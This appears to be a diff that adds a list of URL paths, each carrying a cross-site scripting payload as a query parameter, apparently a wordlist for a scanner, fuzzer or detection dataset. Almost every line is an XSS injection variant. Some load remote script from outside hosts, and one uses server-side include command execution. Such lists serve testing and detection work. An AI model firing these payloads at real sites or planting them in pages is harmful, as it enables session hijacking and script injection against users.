@@ -1,0 +1,532 @@
+/path0/path1/?payload=confirm(2)>/
+/path0/path1/path2/path3/?payload=open()>
+/path0/path1/path2/?payload=location=?javascript:alert(1)>click
+/path0/path1/path2/path3/?payload=<svg><script>alert(/1/)</script>
+/path0/path1/?payload=</script><script>alert(1)</script>
+/path0/path1/?payload=5rt(0);'>rhainfosec
+/path0/path1/?payload=>"<img src=&{document.cookie=true;};>
+/path0/?payload=>"<img src="mocha:document.cookie=true;">
+/path0/path1/path2/path3/?payload=>"<img src="livescript:document.cookie=true;">
+/path0/path1/path2/?payload="data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=">
+/path0/path1/path2/?payload=prompt(1);>
+/path0/?payload=<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("crosssitescripting")>
+/path0/path1/path2/?payload=<iframe src=http://vulnerability-lab.com/index.html <
+/path0/path1/path2/?payload=<table background="javascript:alert('crosssitescripting')">
+/path0/path1/path2/?payload=<table><td background="javascript:alert('crosssitescripting')">
+/?payload=<bgsound src="javascript:alert('crosssitescripting');">
+/path0/path1/path2/?payload=<br size="&{alert('crosssitescripting')}">
+/?payload=<a href="http://server.com/">crosssitescripting</a>
+/?payload=<a href="http://www.google.com">crosssitescripting</a>
+/path0/path1/?payload=<a href="http://1113982867/">crosssitescripting</a>
+/?payload=<a href="javascript:document.location='http://www.vulnerability-lab.com/'">crosssitescripting</a>
+/?payload=<base href="javascript:alert('crosssitescripting');//">
+/?payload=";alert('crosssitescripting');//
+/path0/path1/path2/?payload=<input type="image" src="javascript:alert('crosssitescripting');">
+/path0/path1/?payload=<crosssitescripting style="behavior: url(crosssitescripting.htc);">
+/path0/path1/path2/path3/?payload=scriptalert(crosssitescripting)/script
+/path0/path1/path2/path3/?payload=<img style="crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))">
+/path0/path1/path2/path3/?payload=<crosssitescripting style="crosssitescripting:expression(alert('crosssitescripting'))"> exp/*<a style='no\\crosssitescripting:nocrosssitescripting("*//*"); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert("crosssitescripting"))'>
+/path0/path1/path2/path3/?payload=<html xmlns:crosssitescripting><?import namespace="crosssitescripting" implementation="http://ha.ckers.org/crosssitescripting.htc"><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>
+/path0/path1/path2/path3/?payload=<xml id=i><x><c><![cdata[<img src="javas]]><![cdata[cript:alert('crosssitescripting');">]]>
+/path0/path1/path2/path3/?payload=</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+/path0/path1/path2/path3/?payload=<xml id="crosssitescripting"><i><b><img src="javas<!-- -->cript:alert('crosssitescripting')"></b></i></xml>
+/path0/path1/?payload=<span datasrc="#crosssitescripting" datafld="b" dataformatas="html"></span>
+/path0/path1/path2/?payload=<xml src="crosssitescriptingtest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
+/?payload=<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+/path0/?payload=<?import namespace="t" implementation="#default#time2">
+/path0/path1/path2/?payload=<t:set attributename="innerhtml" to="crosssitescripting<script defer>alert("crosssitescripting")</script>">
+/?payload=</body></html>
+/path0/path1/?payload=<script src="http://vulnerability-lab.com/crosssitescripting.jpg"></script>
+/path0/path1/?payload=<? echo('<scr)';echo('ipt>alert("crosssitescripting")</script>'); ?>
+/path0/path1/path2/?payload=<img src="http://www.vulnerability-lab.com/file.php?variables=malicious">
+/?payload=<iframe src=http://test.de>
+/path0/path1/path2/path3/?payload=<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("xss")>
+/path0/path1/path2/path3/?payload=><img id=xss src=x onerror=alert(xss);>
+/path0/path1/path2/?payload=;!--"<xss>=&{()}"
+/path0/path1/path2/?payload=<img id=xss src="javascript:alert('xss');">
+/path0/path1/path2/path3/?payload=<img id=xss src=javascript:alert('xss')>
+/?payload=<img id=xss src=javascript:alert("xss")>
+/path0/path1/?payload=<img id=xss src=`javascript:alert("'xss'")`>
+/path0/path1/?payload=<img id=xss src="jav ascript:alert('xss');">
+/path0/path1/?payload=<img id=xss src=javascript:alert("xss")>";' >
+/path0/path1/path2/path3/?payload=<img id=xss src=" javascript:alert('xss');">
+/path0/?payload=<<script>alert("xss");//<</script>
+/?payload=";alert('xss');//
+/path0/path1/path2/?payload=<img id=xss src='javascript:alert('xss')
+/path0/?payload=<script>alert(/xss/.source)</script>
+/path0/?payload=<body background="javascript:alert('xss')">
+/path0/path1/path2/path3/?payload=</title><script>alert("xss");</script>
+/path0/path1/path2/path3/?payload=<input type="image" id=xss src="javascript:alert('xss');">
+/path0/?payload=<script>alert('xssya')</script>
+/path0/path1/path2/path3/?payload=<script>alert("xssya")</script>
+/path0/path1/path2/?payload=1<script>prompt(999691)</script>
+/path0/path1/path2/?payload=//1<script>prompt(919397)</script>
+/path0/path1/path2/?payload="<script>alert('xssya')</script>
+/path0/path1/?payload='"</script><script>alert('xssya')</script>
+/path0/path1/?payload=1<script >prompt(962477)</script>
+/path0/?payload=<script>alert(1);</script>
+/path0/?payload="><script>alert('xssya')</script>
+/path0/path1/?payload='';!--"<xss>=&{()}
+/path0/path1/path2/?payload=alert(1)>
+/path0/path1/?payload=";alert(1)//
+/path0/?payload=<script>alert('xssya');</script>
+/path0/path1/path2/?payload='"--></style></script><script>alert('xss')</script>
+/?payload=<scr<script>ipt>alert(1)</scr<script>ipt>
+/path0/path1/path2/?payload=javascript:alert(1)//
+/path0/?payload=<script>confirm(0);</script>
+/path0/path1/path2/path3/?payload="x:alert" onerror="eval(src+'(0)')">
+/?payload=data:text/html,<script>alert(0)</script>
+/?payload=<body/onhashchange=alert(1)><a+href=#>clickit
+/path0/path1/path2/path3/?payload=<img+src=x+onerror=prompt(1);>
+/path0/?payload=<video+src=x+onerror=prompt(1);>
+/?payload="javascript:alert(2)">
+/?payload=";alert('xss)//
+/path0/path1/path2/path3/?payload=<img """><script>alert("xss")</script>">
+/path0/path1/path2/path3/?payload=x onfocus=alert(1)>
+/path0/path1/?payload=<iframe/src="data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg==">
+/path0/?payload="javascript:alert(1)"><input type=submit>
+/path0/?payload=data:text/html, type=image>
+/?payload=<isindex action=j a vas c r ipt:alert(1) type=image>
+/path0/path1/path2/?payload=confirm(2)>
+/path0/?payload="http://www.google.com./">xss</a>
+/?payload="test"></form><button form="test" formaction="javascript:alert(1)">x</button>
+/path0/path1/path2/path3/?payload=write(1) autofocus>
+/path0/path1/path2/?payload=write(1) autofocus><input autofocus>
+/?payload=javascript:alert(1)//></video>
+/path0/path1/?payload=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+/path0/path1/path2/?payload=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>
+/?payload="alert(1)">
+/path0/path1/?payload="alert(1)"><source></source></video>
+/path0/path1/path2/path3/?payload="javascript:alert(1)">x</button>
+/path0/path1/path2/path3/?payload=alert(1)><input autofocus>
+/path0/path1/?payload="javascript:alert(1)">clickme</math>
+/?payload="import" href="test.svg" />
+/?payload=<iframe srcdoc="<img src=x:x onerror=alert(1)>" />
+/path0/path1/path2/?payload="x"><img onerror="alert(1)"></picture>
+/path0/path1/?payload="x" onerror="alert(1)"></picture>
+/path0/path1/?payload=",,,,,x" onerror="alert(1)">
+/path0/path1/path2/?payload="javascript:alert(1)"></table>
+/path0/path1/?payload="--><img src=x onerror=alert(1)//">
+/path0/path1/path2/path3/?payload="</comment><img src=x onerror=alert(1)//">
+/path0/path1/path2/path3/?payload="</style><img src=x onerror=alert(1)//">
+/path0/path1/?payload=list-style:url() onerror=alert(1)></li>
+/path0/?payload=content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>
+/path0/path1/?payload="javascript://"/></head><body><a href="/. /,alert(1)//
+/path0/path1/?payload="data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg=="></object>
+/path0/path1/path2/?payload="data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg=="></embed>
+/path0/path1/path2/?payload=<b <script>alert(1)//</script>0</script></b>
+/path0/path1/path2/?payload="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div>
+/path0/path1/path2/path3/?payload=document.getelementbyid("div1").innerhtml;</script>
+/path0/?payload=width:1px;filter:glow onfilterchange=alert(1)>x</div>
+/path0/path1/path2/path3/?payload=mhtml:http://html5sec.org/test.html!xss.html></iframe>
+/path0/path1/path2/?payload="x` `<script>alert(1)</script>"` `>
+/path0/path1/path2/?payload=alt=alert(1)//">
+/?payload=alert(1)></title><title title=></title>
+/path0/path1/?payload=xx:xx onerror=alert(1)//--!>
+/?payload="-o-link:'javascript:alert(1)';-o-link-source:current">x</a>
+/path0/path1/path2/?payload=<style>@import "data:,*{x:expression(write(1))}";</style>
+/path0/?payload=x:expression8write(1)9>
+/path0/path1/path2/?payload=$,_=1}}).$=alert</script>
+/path0/path1/path2/?payload=<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x</script>
+/path0/?payload=function,[{}][0].constructor._('alert(1)')()</script>
+/path0/path1/path2/?payload="#">{alert(1)}</script>;1
+/?payload=<b><script<b></b><alert(1)</script </b></b>
+/path0/?payload=<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+/path0/path1/path2/?payload=<meta http-equiv="set-cookie" content="userid=<script>document.cookie=true</script>">
+/path0/?payload=<script>document.cookie=true;</script>
+/path0/path1/?payload=<img src="jav ascript:document.cookie=true;">
+/path0/path1/path2/?payload=<img src="javascript:document.cookie=true;">
+/?payload=<img src=" javascript:document.cookie=true;">
+/path0/?payload=<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>
+/path0/path1/path2/path3/?payload=<script>document.cookie=true;//<</script>
+/path0/path1/?payload=<script <b>document.cookie=true;</script>
+/path0/path1/path2/?payload=<iframe src="javascript:document.cookie=true;>
+/?payload=<script>a=/crosssitescripting/ document.cookie=true;</script>
+/path0/?payload=</title><script>document.cookie=true;</script>
+/path0/path1/path2/?payload=<input type="image" src="javascript:document.cookie=true;">
+/path0/path1/path2/?payload=<body background="javascript:document.cookie=true;">
+/path0/path1/path2/?payload=<body onload=document.cookie=true;>
+/path0/path1/path2/?payload=<img dynsrc="javascript:document.cookie=true;">
+/path0/path1/?payload=<img lowsrc="javascript:document.cookie=true;">
+/path0/path1/?payload=<bgsound src="javascript:document.cookie=true;">
+/path0/?payload=<br size="&{document.cookie=true}">
+/path0/path1/?payload=<layer src="javascript:document.cookie=true;"></layer>
+/path0/path1/path2/path3/?payload=<link rel="stylesheet" href="javascript:document.cookie=true;">
+/path0/path1/path2/?payload=<style>li {list-style-image: url("javascript:document.cookie=true;");</style><ul><li>crosssitescripting
+/?payload=scriptdocument.cookie=true;/script
+/path0/path1/path2/path3/?payload=<iframe src="javascript:document.cookie=true;"></iframe>
+/?payload=<frameset><frame src="javascript:document.cookie=true;"></frameset>
+/path0/?payload=<table background="javascript:document.cookie=true;">
+/path0/path1/?payload=<table><td background="javascript:document.cookie=true;">
+/path0/path1/?payload=<div style="background-image: url(javascript:document.cookie=true;)">
+/path0/?payload=<div style="width: expression(document.cookie=true);">
+/path0/path1/path2/?payload=<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
+/path0/?payload=<img style="crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)">
+/path0/path1/path2/?payload=<crosssitescripting style="crosssitescripting:expression(document.cookie=true)">
+/path0/?payload=exp/*<a style='no\\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+/path0/?payload=<style type="text/javascript">document.cookie=true;</style>
+/path0/path1/path2/path3/?payload=<body onload=alert('xss')>
+/path0/path1/path2/?payload=<style>.crosssitescripting{background-image:url("javascript:document.cookie=true");}</style><a class=crosssitescripting></a>
+/?payload=<style type="text/css">body{background:url("javascript:document.cookie=true")}</style>
+/path0/path1/path2/?payload=<base href="javascript:document.cookie=true;//">
+/?payload=<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+/path0/path1/path2/path3/?payload=<xml id=i><x><c><![cdata[<img src="javas]]<![cdata[cript:document.cookie=true;">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+/path0/path1/path2/path3/?payload=<xml id="crosssitescripting"><i><b><img src="javas<!-- -->cript:document.cookie=true"></b></i></xml><span datasrc="#crosssitescripting" datafld="b" dataformatas="html"></span>
+/path0/path1/path2/?payload=<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="crosssitescripting<script defer>document.cookie=true</script>"></body></html>
+/path0/?payload=<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
+/path0/?payload=<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-
+/?payload=<a href="javascript#document.cookie=true;">
+/path0/path1/?payload=<div onmouseover="document.cookie=true;">
+/path0/path1/path2/path3/?payload=<input type="image" dynsrc="javascript:document.cookie=true;">
+/path0/path1/?payload=&<script>document.cookie=true;</script>
+/path0/?payload=&{document.cookie=true;};
+/path0/path1/path2/?payload=<img src=&{document.cookie=true;};>
+/path0/path1/path2/?payload=<img src="mocha:document.cookie=true;">
+/path0/path1/?payload=<img src="livescript:document.cookie=true;">
+/path0/path1/path2/path3/?payload=<a href="about:<script>document.cookie=true;</script>">
+/?payload=<body onload="document.cookie=true;">
+/?payload=<div style="background-image: url(javascript:document.cookie=true;);">
+/path0/?payload=<div style="behaviour: url([link to code]);">
+/?payload=<div style="binding: url([link to code]);">
+/path0/path1/path2/path3/?payload=<div style="width: expression(document.cookie=true;);">
+/path0/path1/?payload=<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+/path0/path1/?payload=<style><!--</style><script>document.cookie=true;//--></script>
+/path0/path1/path2/path3/?payload=<<script>document.cookie=true;</script>
+/?payload=<script>document.cookie=true;//--></script>
+/path0/path1/path2/path3/?payload=<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+/path0/path1/path2/?payload=<img src="blah"onmouseover="document.cookie=true;">
+/path0/path1/path2/?payload=<img src="blah>" onmouseover="document.cookie=true;">
+/path0/path1/path2/?payload=<xml src="javascript:document.cookie=true;">
+/path0/?payload=<xml id="x"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+/path0/?payload=<div datafld="b" dataformatas="html" datasrc="#x"></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>
+/?payload=>"<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+/?payload=>"<meta http-equiv="set-cookie" content="userid=<script>document.cookie=true</script>">
+/path0/path1/path2/path3/?payload=>"<script>document.cookie=true;</script>
+/path0/path1/?payload=>"<img src="jav ascript:document.cookie=true;">
+/path0/path1/path2/?payload=>"<img src="javascript:document.cookie=true;">
+/path0/path1/path2/path3/?payload=>"<img src=" javascript:document.cookie=true;">
+/?payload=>"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>
+/?payload=>"<script>document.cookie=true;//<</script>
+/path0/?payload=>"<script <b>document.cookie=true;</script>
+/path0/path1/?payload=>"<iframe src="javascript:document.cookie=true;>
+/?payload=>"<script>a=/crosssitescripting/ document.cookie=true;</script>
+/path0/path1/?payload=>"</title><script>document.cookie=true;</script>
+/?payload=>"<input type="image" src="javascript:document.cookie=true;">
+/path0/?payload=>"<body background="javascript:document.cookie=true;">
+/?payload=>"<body onload=document.cookie=true;>
+/?payload=>"<img dynsrc="javascript:document.cookie=true;">
+/path0/path1/path2/?payload=>"<img lowsrc="javascript:document.cookie=true;">
+/?payload=>"<bgsound src="javascript:document.cookie=true;">
+/?payload=>"<br size="&{document.cookie=true}">
+/path0/path1/path2/?payload=>"<layer src="javascript:document.cookie=true;"></layer>
+/path0/path1/path2/?payload=>"<link rel="stylesheet" href="javascript:document.cookie=true;">
+/path0/?payload=>"<style>li {list-style-image: url("javascript:document.cookie=true;");</style><ul><li>crosssitescripting
+/?payload=>"scriptdocument.cookie=true;/script
+/path0/path1/path2/?payload=>"<iframe src="javascript:document.cookie=true;"></iframe>
+/?payload=>"<frameset><frame src="javascript:document.cookie=true;"></frameset>
+/path0/?payload=>"<table background="javascript:document.cookie=true;">
+/?payload=>"<table><td background="javascript:document.cookie=true;">
+/path0/path1/?payload=>"<div style="background-image: url(javascript:document.cookie=true;)">
+/path0/path1/?payload=>"<div style="width: expression(document.cookie=true);">
+/path0/path1/path2/path3/?payload=>"<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
+/path0/path1/path2/path3/?payload=>"<img style="crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)">
+/?payload=>"<crosssitescripting style="crosssitescripting:expression(document.cookie=true)">
+/path0/path1/path2/?payload=>"exp/*<a style='no\\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+/path0/path1/path2/path3/?payload=>"<style type="text/javascript">document.cookie=true;</style>
+/path0/?payload=>"<style>.crosssitescripting{background-image:url("javascript:document.cookie=true");}</style><a class=crosssitescripting></a>
+/path0/path1/?payload=>"<style type="text/css">body{background:url("javascript:document.cookie=true")}</style>
+/path0/path1/path2/path3/?payload=>"<base href="javascript:document.cookie=true;//">
+/path0/path1/path2/path3/?payload=>"<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+/path0/?payload=>"<xml id=i><x><c><![cdata[<img src="javas]]<![cdata[cript:document.cookie=true;">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+/path0/?payload=>"<xml id="crosssitescripting"><i><b><img src="javas<!-- -->cript:document.cookie=true"></b></i></xml><span datasrc="#crosssitescripting" datafld="b" dataformatas="html"></span>
+/?payload=>"<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="crosssitescripting<script defer>document.cookie=true</script>"></body></html>
+/path0/path1/path2/?payload=>"<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
+/path0/path1/?payload=>"<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-
+/?payload=>"<a href="javascript#document.cookie=true;">
+/path0/path1/path2/?payload=>"<div onmouseover="document.cookie=true;">
+/?payload=>"<input type="image" dynsrc="javascript:document.cookie=true;">
+/?payload=>"&<script>document.cookie=true;</script>
+/path0/?payload=>"&{document.cookie=true;};
+/path0/path1/path2/path3/?payload=>"<a href="about:<script>document.cookie=true;</script>">
+/path0/path1/path2/?payload=>"<body onload="document.cookie=true;">
+/path0/path1/path2/?payload=>"<div style="background-image: url(javascript:document.cookie=true;);">
+/?payload=>"<div style="behaviour: url([link to code]);">
+/path0/path1/path2/path3/?payload=>"<div style="binding: url([link to code]);">
+/path0/?payload=>"<div style="width: expression(document.cookie=true;);">
+/path0/path1/?payload=>"<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+/path0/path1/path2/path3/?payload=>"<style><!--</style><script>document.cookie=true;//--></script>
+/path0/path1/path2/?payload=>"<<script>document.cookie=true;</script>
+/path0/path1/?payload=>"<script>document.cookie=true;//--></script>
+/path0/path1/path2/?payload=>"<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+/path0/path1/?payload=>"<img src="blah"onmouseover="document.cookie=true;">
+/path0/path1/?payload=>"<img src="blah>" onmouseover="document.cookie=true;">
+/path0/?payload=>"<xml src="javascript:document.cookie=true;">
+/?payload=>"<xml id="x"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+/?payload=>"<div datafld="b" dataformatas="html" datasrc="#x"></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>
+/path0/path1/path2/path3/?payload=-1<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+/path0/?payload=-1<meta http-equiv="set-cookie" content="userid=<script>document.cookie=true</script>">
+/path0/?payload=-1<script>document.cookie=true;</script>
+/path0/path1/path2/path3/?payload=-1<img src="jav ascript:document.cookie=true;">
+/path0/path1/?payload=-1<img src="javascript:document.cookie=true;">
+/path0/path1/?payload=-1<img src=" javascript:document.cookie=true;">
+/?payload=-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>
+/path0/path1/?payload=-1<script>document.cookie=true;//<</script>
+/path0/path1/path2/?payload=-1<script <b>document.cookie=true;</script>
+/path0/path1/?payload=-1<iframe src="javascript:document.cookie=true;>
+/path0/path1/path2/?payload=-1<script>a=/crosssitescripting/ document.cookie=true;</script>
+/path0/path1/path2/?payload=-1</title><script>document.cookie=true;</script>
+/path0/path1/?payload=-1<input type="image" src="javascript:document.cookie=true;">
+/path0/path1/path2/?payload=-1<body background="javascript:document.cookie=true;">
+/path0/path1/path2/path3/?payload=-1<body onload=document.cookie=true;>
+/path0/path1/path2/?payload=-1<img dynsrc="javascript:document.cookie=true;">
+/path0/?payload=-1<img lowsrc="javascript:document.cookie=true;">
+/path0/?payload=-1<bgsound src="javascript:document.cookie=true;">
+/path0/path1/?payload=-1<br size="&{document.cookie=true}">
+/path0/path1/?payload=-1<layer src="javascript:document.cookie=true;"></layer>
+/path0/?payload=-1<link rel="stylesheet" href="javascript:document.cookie=true;">
+/?payload=-1<style>li {list-style-image: url("javascript:document.cookie=true;");</style><ul><li>crosssitescripting
+/path0/path1/path2/path3/?payload=-1scriptdocument.cookie=true;/script
+/path0/?payload=-1<iframe src="javascript:document.cookie=true;"></iframe>
+/path0/path1/?payload=-1<frameset><frame src="javascript:document.cookie=true;"></frameset>
+/?payload=-1<table background="javascript:document.cookie=true;">
+/path0/path1/path2/path3/?payload=-1<table><td background="javascript:document.cookie=true;">
+/path0/?payload=-1<div style="background-image: url(javascript:document.cookie=true;)">
+/path0/path1/?payload=-1<div style="width: expression(document.cookie=true);">
+/path0/?payload=-1<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
+/path0/path1/?payload=-1<img style="crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)">
+/path0/path1/path2/path3/?payload=-1<crosssitescripting style="crosssitescripting:expression(document.cookie=true)">
+/?payload=-1exp/*<a style='no\\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+/path0/path1/?payload=-1<style type="text/javascript">document.cookie=true;</style>
+/path0/?payload=-1<style>.crosssitescripting{background-image:url("javascript:document.cookie=true");}</style><a class=crosssitescripting></a>
+/path0/path1/path2/?payload=-1<style type="text/css">body{background:url("javascript:document.cookie=true")}</style>
+/path0/path1/path2/path3/?payload=-1<base href="javascript:document.cookie=true;//">
+/path0/path1/path2/?payload="><iframe src=a onload=alert("vl") <
+/path0/path1/path2/path3/?payload=-1<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+/?payload=-1<xml id=i><x><c><![cdata[<img src="javas]]<![cdata[cript:document.cookie=true;">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+/?payload=-1<xml id="crosssitescripting"><i><b><img src="javas<!-- -->cript:document.cookie=true"></b></i></xml><span datasrc="#crosssitescripting" datafld="b" dataformatas="html"></span>
+/path0/?payload=-1<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="crosssitescripting<script defer>document.cookie=true</script>"></body></html>
+/?payload=-1<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
+/?payload=-1<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-
+/?payload=-1<a href="javascript#document.cookie=true;">
+/path0/path1/?payload=-1<div onmouseover="document.cookie=true;">
+/path0/path1/path2/?payload=-1<input type="image" dynsrc="javascript:document.cookie=true;">
+/path0/?payload=-1&<script>document.cookie=true;</script>
+/path0/path1/path2/path3/?payload=-1&{document.cookie=true;};
+/path0/path1/path2/?payload=-1<img src=&{document.cookie=true;};>
+/?payload=-1<img src="mocha:document.cookie=true;">
+/?payload=-1<img src="livescript:document.cookie=true;">
+/?payload=<img dyn id=xss src="javascript:alert('xss')">
+/path0/path1/path2/path3/?payload=-1<a href="about:<script>document.cookie=true;</script>">
+/path0/path1/?payload=-1<body onload="document.cookie=true;">
+/path0/path1/?payload=-1<div style="background-image: url(javascript:document.cookie=true;);">
+/path0/path1/?payload=-1<div style="behaviour: url([link to code]);">
+/path0/?payload=-1<div style="binding: url([link to code]);">
+/path0/path1/path2/path3/?payload=-1<div style="width: expression(document.cookie=true;);">
+/path0/path1/path2/path3/?payload=-1<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+/path0/path1/path2/?payload=-1<style><!--</style><script>document.cookie=true;//--></script>
+/path0/path1/?payload=-1<<script>document.cookie=true;</script>
+/path0/path1/?payload=-1<script>document.cookie=true;//--></script>
+/?payload=-1<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+/path0/path1/path2/path3/?payload=-1<img src="blah"onmouseover="document.cookie=true;">
+/path0/?payload=-1<img src="blah>" onmouseover="document.cookie=true;">
+/path0/path1/path2/?payload=-1<xml src="javascript:document.cookie=true;">
+/?payload=-1<xml id="x"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+/path0/?payload=-1<div datafld="b" dataformatas="html" datasrc="#x"></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>
+/path0/?payload=>"<iframe src=http://vulnerability-lab.com/>@gmail.com
+/?payload=>"<script>alert(document.cookie)</script><div style="1@gmail.com
+/path0/path1/path2/?payload=>"<script>alert(document.cookie)</script>@gmail.com
+/path0/path1/path2/path3/?payload=<iframe src=http://vulnerability-lab.com/>@gmail.com
+/?payload=<script>alert(document.cookie)</script><div style="1@gmail.com
+/path0/path1/path2/path3/?payload=<script>alert(document.cookie)</script>@gmail.com
+/?payload=+49/>"<iframe src=http://vulnerability-lab.com>1337
+/path0/path1/path2/?payload="><iframe src='' onload=alert('mphone')>
+/?payload=<iframe src=http://vulnerability-lab.com>1337+1
+/path0/path1/?payload=><script>alert("vlab")</script>
+/path0/?payload=>"<iframe src=http://vulnerability-lab.com></iframe>
+/path0/?payload=<html><body>
+/path0/path1/path2/?payload=<button.onclick="alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));">string:from.char.code</button></body></html>
+/?payload=';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></script>">'><script>alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</script>
+/path0/path1/path2/path3/?payload='';!--"<crosssitescripting>=&{()}
+/path0/path1/path2/path3/?payload=<script>alert("crosssitescripting2")</script>
+/?payload=<script>alert(document.cookie)</script>
+/path0/path1/path2/path3/?payload=<iframe src=http://www.vulnerability-lab.com>
+/?payload=<script>alert('vl')</script>
+/path0/?payload=<!--#exec cmd="/bin/echo '<scr'"--><!--#exec cmd="/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'"-->
+/path0/?payload=<script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com
+/path0/path1/path2/path3/?payload=<img src=javascript:alert("crosssitescripting")>";' >
+/path0/path1/path2/?payload=<script>alert("crosssitescripting")</script>";' >
+/?payload=<!--[if gte ie 4]> <script>alert('crosssitescripting');</script> <![endif]-->
+/?payload=<embed src="http://vulnerability-lab.com/crosssitescripting.swf" allowscriptaccess="always"></embed>
+/path0/path1/path2/path3/?payload=<embed src="data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==" type="image/svg+xml" allowscriptaccess="always"></embed>
+/?payload=<object type="application/x-shockwave-flash" data="http://www.vulnerability-lab.com/hack.swf" width="300" height="300">
+/?payload=<script src=http://vulnerability-lab.com/crosssitescripting.js></script>
+/?payload=<<script>alert("crosssitescripting");//<</script>
+/?payload=<script src=http://vulnerability-lab.com/crosssitescripting.js?<b>
+/path0/path1/path2/?payload=<script src=//vulnerability-lab.com/.js>
+/path0/path1/path2/path3/?payload=<script>a=/crosssitescripting/ alert(a.source)</script>
+/path0/?payload=<script a=">" src="http://vulnerability-lab.com/crosssitescripting.js"></script>
+/path0/path1/path2/path3/?payload=<script a=`>` src="http://vulnerability-lab.com/crosssitescripting.js"></script>
+/path0/path1/?payload=<script>document.write("<scri");</script>pt src="http://vulnerability-lab.com/crosssitescripting.js"></script>
